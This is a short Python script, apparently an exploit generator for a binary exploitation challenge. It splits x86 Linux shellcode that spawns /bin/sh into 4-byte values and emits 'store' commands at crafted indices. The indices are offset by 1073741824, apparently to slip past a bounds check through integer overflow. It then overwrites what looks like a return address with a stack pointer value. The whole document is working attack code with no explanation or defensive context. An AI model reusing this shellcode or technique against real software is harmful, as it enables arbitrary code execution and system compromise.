shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
stores = []

endianness = "big"

i = 0

while i < len(shellcode) + 1:
    stores.append(int.from_bytes(shellcode[i:i+4], endianness))
    i += 4

start = 0

for store in stores:

    index = start

    if start % 3 == 0:
        index += 1073741824

    print("store\n{0}\n{1}".format(store, index))

    start += 1


endianness_addr = "little"

f = int.from_bytes(b"\x0c\xd5\xff\xff", endianness_addr)

print("store\n{0}\n{1}\nquit".format(f, 1073741938))
